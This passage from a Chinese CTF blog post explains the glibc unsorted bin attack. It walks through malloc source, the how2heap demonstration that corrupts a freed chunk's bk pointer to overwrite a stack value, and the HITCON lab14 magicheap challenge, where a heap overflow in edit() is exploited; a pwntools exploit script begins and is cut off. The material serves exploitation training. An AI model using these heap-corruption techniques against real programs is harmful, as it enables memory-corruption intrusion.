class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></details><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><ul><li>还是老样子，使用<code>how2heap</code>的例子，进行动态调试然后画图理解利用过程。</li></ul><details>    <summary>源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">   <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="type">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>将源码翻译一遍</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line">fprintf(stderr, <span class="string">&quot;这个文件通过写入一个很大的无符号长整型的值到栈上演示了unsorted_bin_attack\n&quot;</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;在实践中, unsorted bin attack 一般是为了进一步攻击做准备, 例如重新写&quot;</span></span><br><span class="line">   <span class="string">&quot;在libc中全局的变量global_max_fast为了进一步的fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">unsigned long stack_var=<span class="number">0</span>;</span><br><span class="line">fprintf(stderr, <span class="string">&quot;让我们先来看我们想要重新写入的目标栈:\n&quot;</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">unsigned long *p=malloc(<span class="number">400</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;现在, 我们首先在堆中分配一个正常的chunk,该chunk的地址为: %p\n&quot;</span>,p);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;同时分配另一个正常的chunk,为了防止第一个申请的chunk在free()期间与top chunk合并\n\n&quot;</span>);</span><br><span class="line">malloc(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">free(p);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;现在我们释放第一个chunk,并且它将被插入unsorted bin中,它的指针指向的地址为: %p\n&quot;</span>,(void*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">//------------VULNERABILITY-----------</span><br><span class="line"></span><br><span class="line">p[<span class="number">1</span>]=(unsigned long)(&amp;stack_var-<span class="number">2</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;现在模拟一个能修改victim-&gt;bk指针的漏洞\n&quot;</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;我们用 目标栈地址-16的值(在32-bit机器中,它应该是 目标栈地址-8):%p\n\n&quot;</span>,(void*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">//------------------------------------</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">400</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;让我们再一次申请,从而得到我们刚刚释放的chunk. 在这期间, 目标栈已经被重写\n&quot;</span>);</span><br><span class="line">fprintf(stderr, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (void*)stack_var);</span><br><span class="line">&#125;</span><br><span class="line">//在ubuntu16<span class="number">.04</span>环境下编译该程序</span><br><span class="line">//gcc -o lab1 lab1.c</span><br></pre></td></tr></table></figure><ul><li>编译后我们先运行一下该程序，运行结果如下，目前的我们对<code>unsorted_bin_attack</code>的利用还是不太清楚，接下来我们就来动态调试。并且画图理解。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327104549203.png" alt="image-20250327104549203"></p><ul><li>首先我们再栈上定义了一个<code>unsigned long stack_var=0;</code>，定义完这个变量之后，先申请了一个大小为<code>400</code>的堆块。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105229873.png" alt="image-20250327105229873"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105253736.png" alt="image-20250327105253736"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105329656.png" alt="image-20250327105329656"></p><ul><li>然后为了防止之后释放堆块的时候，堆块与<code>top_chunk</code>合并，所以我们再申请了一个<code>500</code>大小的堆块。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105429255.png" alt="image-20250327105429255"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105500939.png" alt="image-20250327105500939"></p><ul><li>之后我们释放第一次申请的堆块，该堆块会被放入<code>unsorted_bin</code>中</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105604255.png" alt="image-20250327105604255"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105612020.png" alt="image-20250327105612020"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327105902464.png" alt="image-20250327105902464"></p><ul><li>这时我们修改该堆块的<code>bk</code>指针，将该指针指向<code>stack_var</code>这个变量的地址。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327110343767.png" alt="image-20250327110343767"></p><ul><li>修改完之后我们再次申请这个堆块，申请后我们的栈上的<code>stack_var</code>的值就会变成<code>main_arena+88</code>的地址，并且<code>stack_var_addr+0x8</code>会指向我们刚申请回来的堆块。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327110653539.png" alt="image-20250327110653539"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327110913946.png" alt="image-20250327110913946"></p><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327111302955.png" alt="image-20250327111302955"></p><ul><li>在实际修改<code>bk</code>指针的时候，一般<code>fd</code>指针也会被修改，但是<strong>将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系</strong></li></ul><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><ul><li>这个<code>unsorted_bin_attack</code>一般也是起到辅助作用，基本上是<code>house of</code>组合技中的一环。</li><li>接下来就介绍一下后续的利用方式<ul><li>我们通过修改循环的次数来使得程序可以执行多次循环。控制循环次数的变量一般都是在栈上。</li><li>我们通过修改<code>idx</code>的大小，增加我们申请堆块的次数。</li><li>我们可以修改 heap 中的 <code>global_max_fast</code> 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li></ul></li></ul><h1 id="unsorted_bin_attack_level_1"><a href="#unsorted-bin-attack-level-1" class="headerlink" title="unsorted_bin_attack_level_1"></a>unsorted_bin_attack_level_1</h1><ul><li>题目来源：HITCON Training lab14 magic heap</li><li>题目附件：上网搜一下就有</li><li>直接使用<code>glibc-all-in-one</code>项目配合<code>patchelf</code></li><li>考点：<code>堆溢出</code>、<code>unsorted_bin_attack</code></li></ul><h2 id="level1分析1"><a href="#level1分析1" class="headerlink" title="level1分析1"></a>level<em>1</em>分析1</h2><ul><li>先<code>check</code>一下保护机制。发现如下图所示的保护机制。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327114958605.png" alt="image-20250327114958605"></p><ul><li>然后运行一下程序查看一下程序的具体逻辑。一开始还是一个经典堆菜单的题目。<code>add</code>、<code>edit</code>、<code>dele</code>、<code>exit</code>这三个。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327115035136.png" alt="image-20250327115035136"></p><ul><li>我们选择<code>1</code>后的具体执行过程。分别输入<code>选择</code>、<code>大小</code>、<code>内容</code></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327115149367.png" alt="image-20250327115149367"></p><ul><li>选择<code>2</code>后的具体执行过程。分别输入<code>选择</code>、<code>索引</code>、<code>大小</code>、<code>内容</code></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327115232672.png" alt="image-20250327115232672"></p><ul><li>选择<code>3</code>后具体执行的过程。分别输入<code>选择</code>、<code>索引</code></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327115313844.png" alt="image-20250327115313844"></p><ul><li>选择<code>4</code>就直接退出</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327115346749.png" alt="image-20250327115346749"></p><ul><li>接下来我们反编译一下这个程序，查看程序的具体执行逻辑。接下来我们来查看一下这个程序反编译后的<code>main</code>函数的具体执行逻辑。</li><li>该程序先是对输入、输出进行初始化，初始化之后进入两个循环。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327202821811.png" alt="image-20250327202821811"></p><ul><li>然后接下去查看，接下去的程序逻辑才是比较重要的。<ul><li>程序先会输出我们之前看到的菜单，然后让用户做出选择。</li><li><code>1</code>就是创建一个堆块，<code>2</code>就是修改一个堆块，<code>3</code>就是删除堆块。</li><li><strong>注意这边我们还看到了一个<code>4869</code>选项，这边选项会判断<code>magic</code>是否大于<code>0x1305</code>，如果大于就会执行<code>l33t()</code>函数</strong></li></ul></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327203011584.png" alt="image-20250327203011584"></p><ul><li>而<code>l33t()</code>这个函数是执行的就是<code>cat flag</code>的命令操作。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327203228885.png" alt="image-20250327203228885"></p><ul><li>接下来我们就查看<code>add()</code>、<code>delete()</code>、<code>edit()</code>这三个函数。</li><li>先来查看<code>add()</code>这个函数<ul><li>这个函数先会判断<code>heaparray</code>这个全局变量的数组里面的元素是不是空的，这个数组就是一个指针数组，存放着<code>malloc()</code>返回的堆地址。</li><li>然后会让用户输入要申请堆块的大小，申请堆块的大小后程序就会让用户向刚申请的堆块写入数据。这里不存在堆溢出。</li></ul></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327203337420.png" alt="image-20250327203337420"></p><ul><li>现在我们查看<code>delete()</code>函数，这个函数的具体执行逻辑如下。<ul><li>程序先会让用户输入要释放的堆块对应的索引。</li><li>用户输入后，程序会判断是否超出索引范围，并判断这个索引是否存放有堆块。</li><li>如果存放有堆块就会释放对应索引的堆块，然后将对应索引的位置设置为<code>0</code></li><li>注意：<strong>这里不存在<code>UAF</code>漏洞</strong></li></ul></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327203742940.png" alt="image-20250327203742940"></p><ul><li>最后我们来查看<code>edit()</code>函数</li><li>这个函数基本上也会让用户输入指定索引，然后判断索引是否超出范围</li><li>注意：<strong>这里程序可以让用户指定输入的大小，所以用户就可以指定输入比较大的值，从而造成堆溢出操作</strong></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327204038082.png" alt="image-20250327204038082"></p><h2 id="level1分析2"><a href="#level1分析2" class="headerlink" title="level1分析2"></a>level<em>1</em>分析2</h2><ul><li>这题的利用也就比较明显了，我们先申请三个堆块。利用方式其实就是<code>unsorted_bin_attack</code>，所以我们就要通过漏洞去修改处于<code>unsorted_bin</code>中的堆块对应的<code>bk</code>指针。</li><li>所以我们一开始需要申请<code>3</code>个堆块，按申请的顺序分别命名为<code>chunk0</code>、<code>chunk1</code>、<code>chunk2</code>。<ul><li>其中<code>chunk0</code>的作用是用于从而修改<code>chunk1的bk</code>指针。</li><li><code>chunk1</code>的作用是用于释放，释放后其会被放入到<code>unsorted_bin</code>中，所以要申请比较大的堆块使得这个堆块并不会被放入<code>fastbin</code>链表中。</li><li>接下来我们申请的<code>chunk2</code>是防止在释放<code>chunk1</code>时<code>chunk1</code>与<code>top_chunk</code>合并。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./magicheap&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content of heap :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span 